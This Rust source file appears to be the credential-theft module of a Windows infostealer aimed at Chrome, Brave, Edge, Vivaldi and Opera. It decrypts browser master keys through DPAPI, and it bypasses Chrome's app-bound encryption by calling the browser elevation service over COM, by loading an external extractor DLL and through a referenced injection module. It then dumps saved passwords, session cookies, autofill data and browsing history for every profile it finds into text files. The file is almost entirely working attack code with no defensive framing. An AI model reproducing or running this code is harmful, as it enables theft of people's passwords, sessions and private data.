use std::{env, ffi::c_void, fs, path::{Path, PathBuf}};
use rusqlite::Connection;
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
use base64::{engine::general_purpose, Engine as _};
use serde_json::Value;
use windows::core::GUID;
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
use winreg::RegKey;
use winreg::enums::HKEY_LOCAL_MACHINE;
use libloading::{Library, Symbol};
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;

type GetAppBoundKeyFn = unsafe extern "C" fn(*const u16, *mut u8, usize) -> bool;

struct BrowserInfo {
    name: &'static str,
    user_data: PathBuf,
    has_profiles: bool,
}

struct MasterKeys {
    standard: Vec<u8>,
    app_bound: Option<Vec<u8>>,
}

/// Charge la DLL `appbound_extractor.dll` et appelle `GetAppBoundKey`
fn get_app_bound_key_from_dll(exe_path: &Path) -> Option<Vec<u8>> {
    // 1. Essayer dans le dossier de l'exécutable courant
    let exe_dir = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.to_path_buf()))
        .unwrap_or_else(|| PathBuf::from("."));

    let dll_path = exe_dir.join("appbound_extractor.dll");
    if !dll_path.exists() {
        // Fallback : répertoire courant
        let fallback = PathBuf::from("appbound_extractor.dll");
        if !fallback.exists() {
            eprintln!("[ERROR] appbound_extractor.dll not found. Tried {:?} and {:?}", dll_path, fallback);
            return None;
        }
        // Utiliser le fallback
        return load_and_call_dll(&fallback, exe_path);
    }
    load_and_call_dll(&dll_path, exe_path)
}

fn load_and_call_dll(dll_path: &Path, exe_path: &Path) -> Option<Vec<u8>> {
    let lib = match unsafe { Library::new(dll_path) } {
        Ok(l) => l,
        Err(e) => {
            eprintln!("[ERROR] Failed to load {}: {}", dll_path.display(), e);
            return None;
        }
    };

    let func: Symbol<GetAppBoundKeyFn> = match unsafe { lib.get(b"GetAppBoundKey") } {
        Ok(f) => f,
        Err(e) => {
            eprintln!("[ERROR] Failed to find GetAppBoundKey export in {}: {}", dll_path.display(), e);
            return None;
        }
    };

    let path_wide: Vec<u16> = exe_path.as_os_str().encode_wide().chain(Some(0)).collect();
    let mut key = vec![0u8; 32];

    unsafe {
        if func(path_wide.as_ptr(), key.as_mut_ptr(), key.len()) {
            Some(key)
        } else {
            eprintln!("[ERROR] GetAppBoundKey returned false for {:?}", exe_path);
            None
        }
    }
}

fn get_browsers() -> Vec<BrowserInfo> {
    let local = env::var("LOCALAPPDATA").unwrap_or_default();
    let roaming = env::var("APPDATA").unwrap_or_default();
    vec![
        BrowserInfo {
            name: "Chrome",
            user_data: PathBuf::from(&local).join("Google").join("Chrome").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Brave",
            user_data: PathBuf::from(&local).join("BraveSoftware").join("Brave-Browser").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Edge",
            user_data: PathBuf::from(&local).join("Microsoft").join("Edge").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Vivaldi",
            user_data: PathBuf::from(&local).join("Vivaldi").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Opera",
            user_data: PathBuf::from(&roaming).join("Opera Software").join("Opera Stable"),
            has_profiles: false,
        },
        BrowserInfo {
            name: "OperaGX",
            user_data: PathBuf::from(&roaming).join("Opera Software").join("Opera GX Stable"),
            has_profiles: false,
        },
    ]
}

fn dpapi_decrypt(data: &[u8], entropy: Option<&[u8]>, flags: u32) -> Option<Vec<u8>> {
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        let mut ent_blob = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        let ent_ptr = match entropy {
            Some(e) => {
                ent_blob.cbData = e.len() as u32;
                ent_blob.pbData = e.as_ptr() as *mut u8;
                Some(&ent_blob as *const CRYPT_INTEGER_BLOB)
            }
            None => None,
        };
        if CryptUnprotectData(&mut input, None, ent_ptr, None, None, flags, &mut output).is_ok() {
            Some(std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec())
        } else {
            None
        }
    }
}

fn get_browser_exe_from_registry(app_name: &str) -> Option<PathBuf> {
    let key_path = format!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\{}", app_name);
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(key) = hklm.open_subkey(&key_path) {
        if let Ok(path) = key.get_value::<String, _>("") {
            let p = PathBuf::from(path);
            if p.exists() {
                return Some(p);
            }
        }
    }
    None
}

fn find_browser_exe(browser_name: &str) -> Vec<PathBuf> {
    let mut candidates = Vec::new();
    let exe_name = match browser_name {
        "Chrome" => "chrome.exe",
        "Edge" => "msedge.exe",
        "Brave" => "brave.exe",
        "Vivaldi" => "vivaldi.exe",
        "Opera" | "OperaGX" => "opera.exe",
        _ => "",
    };
    if !exe_name.is_empty() {
        if let Some(p) = get_browser_exe_from_registry(exe_name) {
            candidates.push(p);
        }
    }
    let pf = env::var("ProgramFiles").unwrap_or_default();
    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
    let local = env::var("LOCALAPPDATA").unwrap_or_default();
    let hardcoded = match browser_name {
        "Chrome" => vec![
            PathBuf::from(&pf).join("Google\\Chrome\\Application\\chrome.exe"),
            PathBuf::from(&pf86).join("Google\\Chrome\\Application\\chrome.exe"),
            PathBuf::from(&local).join("Google\\Chrome\\Application\\chrome.exe"),
        ],
        "Edge" => vec![
            PathBuf::from(&pf).join("Microsoft\\Edge\\Application\\msedge.exe"),
            PathBuf::from(&pf86).join("Microsoft\\Edge\\Application\\msedge.exe"),
        ],
        "Brave" => vec![
            PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
            PathBuf::from(&pf86).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
            PathBuf::from(&local).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
        ],
        "Vivaldi" => vec![
            PathBuf::from(&local).join("Vivaldi\\Application\\vivaldi.exe"),
            PathBuf::from(&pf).join("Vivaldi\\Application\\vivaldi.exe"),
        ],
        "Opera" | "OperaGX" => vec![
            PathBuf::from(&local).join("Programs\\Opera\\opera.exe"),
            PathBuf::from(&local).join("Programs\\Opera GX\\opera.exe"),
        ],
        _ => vec![],
    };
    candidates.extend(hardcoded);
    let mut unique = Vec::new();
    for p in candidates {
        if p.exists() && !unique.contains(&p) {
            unique.push(p);
        }
    }
    unique
}

fn path_to_entropy(path: &Path) -> Vec<u8> {
    let lowered: String = path
        .to_string_lossy()
        .chars()
        .map(|c| if c.is_ascii_uppercase() { c.to_ascii_lowercase() } else { c })
        .collect();
    lowered.encode_utf16().flat_map(|w| w.to_le_bytes()).collect()
}

fn build_entropy_candidates(exe_path: &Path) -> Vec<Vec<u8>> {
    let mut candidates = Vec::new();
    let path_str = exe_path.to_string_lossy();

    candidates.push(path_to_entropy(exe_path));

    let upper = path_str.to_ascii_uppercase();
    candidates.push(upper.encode_utf16().flat_map(|w| w.to_le_bytes()).collect());

    if let Some(parent) = exe_path.parent() {
        candidates.push(path_to_entropy(parent));
        let parent_upper = parent.to_string_lossy().to_ascii_uppercase();
        candidates.push(parent_upper.encode_utf16().flat_map(|w| w.to_le_bytes()).collect());
    }

    if let Some(file_name) = exe_path.file_name().and_then(|f| f.to_str()) {
        let name_lower = file_name.to_lowercase();
        candidates.push(name_lower.encode_utf16().flat_map(|w| w.to_le_bytes()).collect());
        let name_upper = file_name.to_ascii_uppercase();
        candidates.push(name_upper.encode_utf16().flat_map(|w| w.to_le_bytes()).collect());
    }

    let mut unique = Vec::new();
    for e in candidates {
        if !unique.contains(&e) {
            unique.push(e);
        }
    }
    unique
}

fn decrypt_with_elevation_service(encrypted_data: &[u8]) -> Option<Vec<u8>> {
    let data = encrypted_data.to_vec();
    std::thread::spawn(move || -> Option<Vec<u8>> {
        unsafe {
            let ole32 = libloading::Library::new("ole32.dll").ok()?;
            type CoInitExFn = unsafe extern "system" fn(*mut c_void, u32) -> i32;
            type CoCreateFn = unsafe extern "system" fn(*const GUID, *mut c_void, u32, *const GUID, *mut *mut c_void) -> i32;
            type CoUninitFn = unsafe extern "system" fn();
            type CoFreeFn = unsafe extern "system" fn(*mut c_void);
            let co_init: libloading::Symbol<CoInitExFn> = ole32.get(b"CoInitializeEx").ok()?;
            let co_create: libloading::Symbol<CoCreateFn> = ole32.get(b"CoCreateInstance").ok()?;
            let co_uninit: libloading::Symbol<CoUninitFn> = ole32.get(b"CoUninitialize").ok()?;
            let co_free: libloading::Symbol<CoFreeFn> = ole32.get(b"CoTaskMemFree").ok()?;

            let init_hr = co_init(std::ptr::null_mut(), 0x2);
            let need_uninit = init_hr == 0;

            let result = (|| -> Option<Vec<u8>> {
                let clsids: &[GUID] = &[
                    GUID { data1: 0x708860E0, data2: 0xF641, data3: 0x4611, data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B] },
                    GUID { data1: 0xDD2646BA, data2: 0x3707, data3: 0x4A96, data4: [0xB7, 0x7A, 0xB7, 0xBE, 0x5C, 0x9A, 0x19, 0x0C] },
                    GUID { data1: 0xDA7FDCA5, data2: 0x2CAA, data3: 0x4637, data4: [0xAA, 0x17, 0x07, 0x40, 0x58, 0x4D, 0xE7, 0xDA] },
                    GUID { data1: 0xC46F6B0D, data2: 0xE0D1, data3: 0x46B2, data4: [0x82, 0xFF, 0xF7, 0xB8, 0xB9, 0x2E, 0xB0, 0xFC] },
                    GUID { data1: 0x3A84F9C2, data2: 0x6164, data3: 0x485C, data4: [0xA7, 0xD9, 0x4B, 0x27, 0xF8, 0xAC, 0x00, 0x9E] },
                ];
                let iids: &[GUID] = &[
                    GUID { data1: 0xA949CB4E, data2: 0xC4F9, data3: 0x44C4, data4: [0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C] },
                    GUID { data1: 0xB88C45B9, data2: 0x8825, data3: 0x4629, data4: [0xB8, 0x3E, 0x77, 0xCC, 0x67, 0xD9, 0xCE, 0xED] },
                    GUID { data1: 0x463ABECF, data2: 0x410D, data3: 0x407F, data4: [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8] },
                ];
                for clsid in clsids {
                    for iid in iids {
                        let mut obj: *mut c_void = std::ptr::null_mut();
                        let hr = co_create(clsid, std::ptr::null_mut(), 0x4, iid, &mut obj);
                        println!("[COM] CoCreateInstance hr = 0x{:08X}", hr);
                        if hr != 0 || obj.is_null() {
                            continue;
                        }
                        let vtable = *(obj as *const *const usize);
                        if vtable.is_null() { continue; }
                        type DecryptFn = unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut *mut u8, *mut u32) -> i32;
                        let decrypt: DecryptFn = std::mem::transmute(*vtable.add(5));
                        let mut out_ptr: *mut u8 = std::ptr::null_mut();
                        let mut out_len: u32 = 0;
                        let hr = decrypt(obj, data.as_ptr(), data.len() as u32, &mut out_ptr, &mut out_len);
                        println!("[COM] DecryptData hr = 0x{:08X}, out_len = {}", hr, out_len);
                        type ReleaseFn = unsafe extern "system" fn(*mut c_void) -> u32;
                        let release: ReleaseFn = std::mem::transmute(*vtable.add(2));
                        release(obj);
                        if hr == 0 && !out_ptr.is_null() && out_len > 0 {
                            let key = std::slice::from_raw_parts(out_ptr, out_len as usize).to_vec();
                            co_free(out_ptr as *mut c_void);
                            return Some(key);
                        }
                    }
                }
                None
            })();
            if need_uninit { co_uninit(); }
            result
        }
    }).join().ok()?
}

fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<MasterKeys> {
    let local_state = user_data_path.join("Local State");
    let content = fs::read_to_string(&local_state).ok()?;
    let json: Value = serde_json::from_str(&content).ok()?;

    let enc_key = json["os_crypt"]["encrypted_key"].as_str()?;
    let decoded = general_purpose::STANDARD.decode(enc_key).ok()?;
    if decoded.len() < 5 { return None; }
    let standard = dpapi_decrypt(&decoded[5..], None, 0)?;

    let app_bound = match browser_name {
        "Chrome" => crate::chrome_inject::fetch_chrome_app_bound_key(),
        // Brave / Edge: injection support coming later
        _ => None,
    }.or_else(|| get_app_bound_key_from_path(browser_name, user_data_path))
        .or_else(|| extract_app_bound_key(&json, browser_name));

    Some(MasterKeys { standard, app_bound })
}

fn get_app_bound_key_from_path(browser_name: &str, _user_data_path: &Path) -> Option<Vec<u8>> {
    let exe_paths = find_browser_exe(browser_name);
    for exe in exe_paths {
        if let Some(key) = get_app_bound_key_from_dll(&exe) {
            return Some(key);
        }
    }
    None
}

fn extract_app_bound_key(json: &Value, browser_name: &str) -> Option<Vec<u8>> {
    let enc_key = json["os_crypt"]["app_bound_encrypted_key"].as_str()?;
    let decoded = general_purpose::STANDARD.decode(enc_key).ok()?;
    if decoded.len() < 4 || &decoded[0..4] != b"APPB" { return None; }

    let exe_paths = find_browser_exe(browser_name);
    let mut entropies = Vec::new();
    for exe in &exe_paths {
        entropies.extend(build_entropy_candidates(exe));
    }
    entropies.push(Vec::new());

    println!("[DEBUG] Trying app_bound for {}", browser_name);
    println!("[DEBUG] Exe paths found: {:?}", exe_paths);
    println!("[DEBUG] Total entropy candidates: {}", entropies.len());

    for strip_len in [4usize, 5, 6] {
        if decoded.len() <= strip_len { continue; }
        let blob = &decoded[strip_len..];
        for (idx, ent) in entropies.iter().enumerate() {
            let entropy_arg = if ent.is_empty() { None } else { Some(ent.as_slice()) };
            let flags = 0x4;
            if let Some(dec) = dpapi_decrypt(blob, entropy_arg, flags) {
                println!("[DEBUG] DPAPI SUCCESS (entropy #{})", idx);
                if let Some(key) = try_extract_key(&dec) {
                    println!("[DEBUG] Key extracted via DPAPI");
                    return Some(key);
                }
            } else {
                if !ent.is_empty() {
                    let preview = ent.iter().take(16).map(|b| format!("{:02x}", b)).collect::<String>();
                    println!("[DEBUG] DPAPI FAILED entropy #{} preview: {}...", idx, preview);
                } else {
                    println!("[DEBUG] DPAPI FAILED with no entropy");
                }
            }
        }
    }

    println!("[DEBUG] Trying COM fallback...");
    for strip_len in [4usize, 5, 6] {
        if decoded.len() <= strip_len { continue; }
        let blob = &decoded[strip_len..];
        if let Some(dec) = decrypt_with_elevation_service(blob) {
            println!("[DEBUG] COM SUCCESS, len={}", dec.len());
            if let Some(key) = try_extract_key(&dec) {
                println!("[DEBUG] Key extracted via COM");
                return Some(key);
            }
        } else {
            println!("[DEBUG] COM FAILED for strip_len={}", strip_len);
        }
    }

    println!("[DEBUG] All attempts failed");
    None
}

fn try_extract_key(decrypted: &[u8]) -> Option<Vec<u8>> {
    if decrypted.len() == 32 { Some(decrypted.to_vec()) }
    else if decrypted.len() > 32 { Some(decrypted[..32].to_vec()) }
    else { None }
}

fn aes_gcm_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 15 || key.len() != 32 { return None; }
    let iv = &data[3..15];
    let ciphertext = &data[15..];
    if ciphertext.len() < 16 { return None; }
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    let nonce = Nonce::from_slice(iv);
    cipher.decrypt(nonce, ciphertext).ok()
}

fn decrypt_value(encrypted: &[u8], keys: &MasterKeys) -> Option<String> {
    if encrypted.is_empty() { return Some(String::new()); }
    if encrypted.len() > 3 && encrypted.starts_with(b"v20") {
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(pt) = aes_gcm_decrypt(encrypted, ab_key) {
                return String::from_utf8(pt).ok();
            }
        }
        if let Some(pt) = aes_gcm_decrypt(encrypted, &keys.standard) {
            return String::from_utf8(pt).ok();
        }
        return None;
    }
    if encrypted.len() > 3 && (encrypted.starts_with(b"v10") || encrypted.starts_with(b"v11")) {
        if let Some(pt) = aes_gcm_decrypt(encrypted, &keys.standard) {
            return String::from_utf8(pt).ok();
        }
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(pt) = aes_gcm_decrypt(encrypted, ab_key) {
                return String::from_utf8(pt).ok();
            }
        }
        return None;
    }
    dpapi_decrypt(encrypted, None, 0).and_then(|d| String::from_utf8(d).ok())
}

fn copy_db(db_path: &Path) -> Option<PathBuf> {
    if !db_path.exists() { return None; }
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let temp = env::temp_dir().join(format!("cr_db_{}.sqlite", nanos));
    fs::copy(db_path, &temp).ok()?;
    let db_name = db_path.to_string_lossy().to_string();
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in ["-wal", "-shm", "-journal"] {
        let src = PathBuf::from(format!("{}{}", db_name, suffix));
        if src.exists() {
            let dst = PathBuf::from(format!("{}{}", temp_name, suffix));
            let _ = fs::copy(&src, &dst);
        }
    }
    Some(temp)
}

fn cleanup_db(temp: &Path) {
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in ["", "-wal", "-shm", "-journal"] {
        let path = PathBuf::from(format!("{}{}", temp_name, suffix));
        let _ = fs::remove_file(&path);
    }
}

fn extract_passwords(profile_path: &Path, keys: &MasterKeys) -> Option<String> {
    let temp = copy_db(&profile_path.join("Login Data"))?;
    let conn = Connection::open(&temp).ok()?;
    let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins").ok()?;
    let mut output = String::new();
    let rows = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let username: String = row.get(1)?;
        let password: Vec<u8> = row.get(2)?;
        Ok((url, username, password))
    }).ok()?;
    for row in rows.flatten() {
        let (url, username, password_enc) = row;
        if password_enc.is_empty() && username.is_empty() { continue; }
        let version = if password_enc.starts_with(b"v20") { "v20" }
            else if password_enc.starts_with(b"v10") { "v10" }
            else if password_enc.starts_with(b"v11") { "v11" }
            else { "legacy" };
        let password = decrypt_value(&password_enc, keys)
            .unwrap_or_else(|| format!("[encrypted - {}]", version));
        output.push_str(&format!("URL: {}\nUsername: {}\nPassword: {}\n{}\n",
            url, username, password, "-".repeat(50)));
    }
    drop(stmt); drop(conn); cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

fn extract_cookies(profile_path: &Path, keys: &MasterKeys) -> Option<String> {
    let db_path = if profile_path.join("Network").join("Cookies").exists() {
        profile_path.join("Network").join("Cookies")
    } else {
        profile_path.join("Cookies")
    };
    let temp = copy_db(&db_path)?;
    let conn = Connection::open(&temp).ok()?;
    let mut stmt = conn.prepare("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies").ok()?;
    let mut output = String::from("# Netscape HTTP Cookie File\n# https://curl.se/docs/http-cookies.html\n# Generated automatically.\n\n");
    let rows = stmt.query_map([], |row| {
        let host: String = row.get(0)?;
        let name: String = row.get(1)?;
        let enc_value: Vec<u8> = row.get(2)?;
        let path: String = row.get(3)?;
        let expires: i64 = row.get(4)?;
        let is_secure: i64 = row.get(5)?;
        let is_httponly: i64 = row.get(6)?;
        Ok((host, name, enc_value, path, expires, is_secure, is_httponly))
    }).ok()?;
    let mut count = 0;
    for row in rows.flatten() {
        let (host, name, enc_value, path, expires, is_secure, is_httponly) = row;
        let value = decrypt_value(&enc_value, keys).unwrap_or_default();
        if value.is_empty() && enc_value.is_empty() { continue; }
        let unix_expires = if expires > 0 { (expires / 1_000_000) - 11644473600 } else { 0 };
        let subdomain = if host.starts_with('.') { "TRUE" } else { "FALSE" };
        let secure = if is_secure != 0 { "TRUE" } else { "FALSE" };
        let prefix = if is_httponly != 0 { "#HttpOnly_" } else { "" };
        output.push_str(&format!("{}{}\t{}\t{}\t{}\t{}\t{}\t{}\n",
            prefix, host, subdomain, path, secure, unix_expires, name, value));
        count += 1;
    }
    drop(stmt); drop(conn); cleanup_db(&temp);
    if count == 0 { None } else { Some(output) }
}

fn extract_autofill(profile_path: &Path) -> Option<String> {
    let temp = copy_db(&profile_path.join("Web Data"))?;
    let conn = Connection::open(&temp).ok()?;
    let mut stmt = conn.prepare("SELECT name, value, count FROM autofill").ok()?;
    let mut output = String::new();
    let rows = stmt.query_map([], |row| {
        let name: String = row.get(0)?;
        let value: String = row.get(1)?;
        let count: i64 = row.get(2)?;
        Ok((name, value, count))
    }).ok()?;
    for row in rows.flatten() {
        let (name, value, count) = row;
        output.push_str(&format!("Name: {}\nValue: {}\nCount: {}\n{}\n",
            name, value, count, "-".repeat(50)));
    }
    drop(stmt); drop(conn); cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

fn extract_history(profile_path: &Path) -> Option<String> {
    let temp = copy_db(&profile_path.join("History"))?;
    let conn = Connection::open(&temp).ok()?;
    let mut stmt = conn.prepare("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC").ok()?;
    let mut output = String::new();
    let rows = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let title: String = row.get(1)?;
        let visit_count: i64 = row.get(2)?;
        let last_visit: i64 = row.get(3)?;
        Ok((url, title, visit_count, last_visit))
    }).ok()?;
    for row in rows.flatten() {
        let (url, title, visit_count, last_visit) = row;
        output.push_str(&format!("URL: {}\nTitle: {}\nVisits: {}\nLast Visit: {}\n{}\n",
            url, title, visit_count, last_visit, "-".repeat(50)));
    }
    drop(stmt); drop(conn); cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

fn get_profiles(user_data_path: &Path, has_profiles: bool) -> Vec<(String, PathBuf)> {
    let mut profiles = Vec::new();
    if has_profiles {
        let default_path = user_data_path.join("Default");
        if default_path.exists() { profiles.push(("Default".to_string(), default_path)); }
        if let Ok(entries) = fs::read_dir(user_data_path) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.starts_with("Profile ") && entry.path().is_dir() {
                    profiles.push((name, entry.path()));
                }
            }
        }
    } else {
        if user_data_path.exists() { profiles.push(("Default".to_string(), user_data_path.to_path_buf())); }
    }
    profiles
}

pub fn extract_all() -> Vec<(String, String)> {
    let mut results = Vec::new();
    for browser in get_browsers() {
        if !browser.user_data.exists() { continue; }
        let keys = match get_master_keys(&browser.user_data, browser.name) {
            Some(k) => k,
            None => continue,
        };
        let profiles = get_profiles(&browser.user_data, browser.has_profiles);
        for (profile_name, profile_path) in profiles {
            let folder = format!("{}/{}", browser.name, profile_name);
            if let Some(data) = extract_passwords(&profile_path, &keys) {
                results.push((format!("{}/passwords.txt", folder), data));
            }
            if let Some(data) = extract_cookies(&profile_path, &keys) {
                results.push((format!("{}/cookies.txt", folder), data));
            }
            if let Some(data) = extract_autofill(&profile_path) {
                results.push((format!("{}/autofill.txt", folder), data));
            }
            if let Some(data) = extract_history(&profile_path) {
                results.push((format!("{}/history.txt", folder), data));
            }
        }
    }
    results
}